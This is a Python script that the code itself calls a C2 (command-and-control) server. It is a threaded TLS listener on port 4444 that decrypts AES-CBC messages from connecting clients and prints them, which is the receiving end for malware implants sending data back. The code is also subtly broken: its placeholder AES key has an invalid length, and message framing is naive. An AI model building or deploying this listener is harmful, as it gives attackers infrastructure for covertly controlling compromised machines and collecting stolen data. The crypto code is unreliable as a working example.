import socket
import ssl
import threading
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

def create_tls_server_socket(host, port):
    """Create a secure TLS server socket."""
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='server_cert.pem', keyfile='server_key.pem')  # Update with your cert and key
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    return context.wrap_socket(server_socket, server_side=True)

def decrypt_message(encrypted_message, aes_key):
    """Decrypt the message using AES decryption."""
    iv = encrypted_message[:16]
    encrypted_part = encrypted_message[16:]
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded_message = decryptor.update(encrypted_part) + decryptor.finalize()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    return (unpadder.update(padded_message) + unpadder.finalize()).decode()

def handle_client(tls_socket):
    """Handle communication with a connected client."""
    try:
        aes_key = b'your_static_aes_key_32_bytes'  # Update with a secure key management strategy
        while True:
            encrypted_message = tls_socket.recv(1024)
            if not encrypted_message:
                break
            message = decrypt_message(encrypted_message, aes_key)
            print("Received from client:", message)
            # You can add logic to respond to the client here
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        tls_socket.close()

def main():
    host = '0.0.0.0'  # Listen on all available interfaces
    port = 4444
    server_socket = create_tls_server_socket(host, port)
    print("C2 server is running...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == "__main__":
    main()
